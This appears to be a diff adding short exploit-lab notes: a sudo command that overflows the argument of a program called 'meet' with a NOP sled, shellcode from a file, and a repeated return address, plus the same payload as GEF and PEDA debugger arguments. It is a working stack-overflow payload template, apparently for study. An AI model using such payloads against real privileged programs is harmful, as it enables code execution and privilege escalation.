@@ -1,0 +1,11 @@
+sudo ./meet mr "$(perl -e 'print "\x90"x200'; cat sc; perl -e 'print "\x90"x27' ;perl -e 'print "\x18\xf2\xff\xbf"x38')"
+
+
+GEF
+Argument list to give program being debugged when it is started is "mr "$(perl -e 'print "\x90"x200'; cat sc; perl -e 'print "\x90"x27' ;perl -e 'print "\x3a\xef\xff\xbf"x38')"".
+
+
+
+
+PEDA
+Argument list to give program being debugged when it is started is "mr "$(perl -e 'print "\x90"x200'; cat sc; perl -e 'print "\x90"x3' ;perl -e 'print "\x3a\xef\xff\xbf"x38')"".
